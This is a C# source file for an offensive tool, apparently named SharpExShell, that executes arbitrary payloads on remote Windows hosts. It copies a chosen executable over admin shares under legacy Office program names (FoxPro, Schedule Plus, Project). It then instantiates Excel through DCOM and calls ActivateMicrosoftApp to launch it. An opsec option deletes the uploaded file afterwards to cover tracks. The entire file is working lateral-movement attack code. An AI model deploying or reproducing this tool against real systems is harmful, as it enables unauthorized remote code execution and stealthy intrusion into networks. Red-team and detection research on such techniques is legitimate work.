using System;
using System.Threading;
using NDesk.Options;

namespace SharpExShell
{
    class Program
    {
        static void Main(string[] args)
        {

            string Method = null;
            string ComputerName = null;
            string Payload = null;
            bool showhelp = false;
            bool OpSec = false;
            string DestinationFolder = @"\\localhost\Program Files\Microsoft Office\root\Office16\"; //By default it will be uploaded here!!

            OptionSet opts = new OptionSet()
            {
                { "m|Method=", "--Method FoxPro, SchedulePlus, Project", value => Method = value },
                { "t|ComputerName=", "--ComputerName host.example.local, 192.168.1.10", value => ComputerName = value },
                { "p|Payload=", "--Payload C:\\windows\\system32\\calc.exe", value => Payload = value },
                { "d|DestinationFolder=", "--DestinationFolder C:\\Windows\\System32\\", value => DestinationFolder =value },
                { "o|opsec", "Removes the uploaded file", value=> OpSec= value != null },
                { "h|?|help", "Show available options", value => showhelp = value != null },
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (showhelp || args.Length == 0 || ComputerName == null || Payload == null)
            {
                ShowHelp(opts);
                return;
            }

            //Parsing the desitnation file supplied by user
            if (DestinationFolder.Contains(":\\"))
            {
                DestinationFolder = $"\\\\{ComputerName}\\{DestinationFolder}";
                DestinationFolder = DestinationFolder.Replace(':', '$');
            }
            else
            {
                DestinationFolder = DestinationFolder.Replace("localhost", ComputerName);
            }

            try
            {
                if (Method.ToLower() == "foxpro")
                {
                    DestinationFolder += "\\FOXPROW.exe";
                    dynamic excelApp = CreateCOMInstance(Payload, DestinationFolder, ComputerName);
                    excelApp.Application.ActivateMicrosoftApp("5");
                    Console.WriteLine("[+] Attempted to execute the ActivateMicrosoftApp method");
                }
                else if (Method.ToLower() == "scheduleplus")
                {
                    DestinationFolder += "\\SCHDPLUS.exe";
                    dynamic excelApp = CreateCOMInstance(Payload, DestinationFolder, ComputerName);
                    excelApp.Application.ActivateMicrosoftApp("7");
                    Console.WriteLine("[+] Attempted to execute the ActivateMicrosoftApp method");
                }
                else if (Method.ToLower() == "project")
                {
                    DestinationFolder += "\\WINPROJ.exe";
                    dynamic excelApp = CreateCOMInstance(Payload, DestinationFolder, ComputerName);
                    excelApp.Application.ActivateMicrosoftApp("6");
                    Console.WriteLine("[+] Attempted to execute the ActivateMicrosoftApp method");
                }
                else
                {
                    Console.WriteLine("[+] Method name: " + Method + " not found");
                    Console.WriteLine();
                    return;
                }

                if (OpSec)
                {
                    CleanUp(DestinationFolder);
                }
                else
                {
                    Console.WriteLine("[+] Successfully exploited!");
                }

            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[+] DCOM Failed: " + e.Message);
            }
        }

        private static object NewMethod(Type ComType)
        {
            return Activator.CreateInstance(ComType);
        }

        private static void ShowHelp(OptionSet opts)
        {
            Console.WriteLine("Available Commands:");
            Console.WriteLine();
            opts.WriteOptionDescriptions(Console.Out);
            Console.WriteLine();
            Console.WriteLine("[*] Example: SharpExcelDCom.exe -m FoxPro -t localhost -p calc.exe -d C:\\Windows\\System32");
            Console.WriteLine();
            return;
        }

        private static object CreateCOMInstance(String Payload, String DestinationFolder, String ComputerName)
        {
            Guid excelClsid = new Guid("00020812-0000-0000-C000-000000000046"); //Excel CLSID
            System.IO.File.Copy(Payload, DestinationFolder);
            Type ComType = Type.GetTypeFromCLSID(excelClsid, ComputerName);
            dynamic excelApp = Activator.CreateInstance(ComType);
            Console.WriteLine("[+] Successfully created an instance of Excel on " + ComputerName);
            return excelApp;
        }
        private static void CleanUp(String DestinationFolder)
        {
            try
            {
                System.IO.File.Delete(DestinationFolder);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[!] Remove file Failed: " + e.Message);
                Console.WriteLine("[!] Use this command to remove file manually \"rm '" + DestinationFolder + "'\"");
                return;
            }

            Console.WriteLine($"[+] Successfully exploited!!");
            Thread.Sleep(1000);
            Console.WriteLine($"[+] Uploaded File was removed: {DestinationFolder}");
            return;
        }
    }
}
